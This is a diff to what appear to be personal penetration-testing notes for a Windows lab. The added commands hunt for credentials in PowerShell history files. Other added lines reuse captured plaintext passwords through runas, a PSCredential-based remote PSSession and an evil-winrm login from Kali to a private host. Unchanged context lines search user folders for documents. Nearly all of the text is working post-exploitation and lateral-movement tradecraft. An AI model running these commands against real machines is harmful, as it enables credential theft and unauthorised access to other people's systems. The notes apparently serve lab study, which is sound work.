@@ -31,7 +31,21 @@ When you gain access to a windows user do steps bellow:
       Get-ChildItem -Path C:\Users\steve\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
       type C:\Users\dave\Desktop\asdf.txt
 
+      #serching information on command history of the powershell
+      Get-History
+      (Get-PSReadlineOption).HistorySavePath
+      type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 
 
 
 runas /user:"richmond" "powershell -ep bypass"   # GothicLifeStyle1337!
+runas /user:"daveadmin" "powershell -ep bypass"   # qwertqwertqwert123!!
+
+#powershell login
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+
+#from kali
+evil-winrm -i 192.168.210.220 -u daveadmin -p "qwertqwertqwert123\!\!"
